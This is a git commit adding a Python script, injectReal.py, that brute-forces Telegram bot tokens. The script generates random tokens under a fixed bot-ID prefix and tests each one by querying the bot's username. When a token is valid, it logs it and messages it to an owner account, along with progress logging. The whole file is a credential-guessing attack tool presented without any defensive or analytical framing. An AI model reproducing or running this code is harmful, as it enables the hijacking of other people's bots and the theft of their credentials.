c7e8eb5ea950bafb0813cb9e3ba3213ce309e34b
Himanshu kumar <83366556+I-Himanshu@users.noreply.github.com>
2022-05-26 10:08:42 +0530

    Create injectReal.py

---
+++ injectReal.py
@@ -0,0 +1,22 @@
+#ADMlNxd 2.012
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
+for k in range(1000):
+  token = "609517172:" + "".join(random.choices(chars,k=35))
+  new_bot = Bot(token)
+  try:
+    username = new_bot.username
+  except:
+    username = None
+    pass
+  if username:
+    print(token)
+    LOGGING(username)
+    LOGGING(token[11:])
+    new_bot.send_message(OWNER, token)
+    LOGGING("Har Har Mahadev 🚩")
+    LOGGING("#FOUND")
+    LOGGING("🚩 JAI SHREE RAM\n"*20)
+  if botNo == THREAD_COUNT - 1:
+    ATTEMPT += 1
+    if ATTEMPT % 500 == 0:
+      LOGGING(f"🧔 #TASK\n#{GROUP_NAME} Group have completed {ATTEMPT} attempt with {THREAD_COUNT} Bots")
